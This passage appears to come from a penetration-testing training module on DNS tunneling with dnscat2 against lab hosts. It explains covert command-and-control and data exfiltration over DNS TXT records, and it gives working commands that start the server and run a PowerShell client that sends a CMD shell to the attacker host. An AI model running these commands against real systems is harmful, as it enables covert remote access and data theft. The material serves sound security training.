## dnscat2
[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

start server
```shell-session
]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (`-PreSharedSecret`) generated

We can list the options we have with dnscat2 by entering `?` at the prompt.

DNS Tunneling with Dnscat2

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.
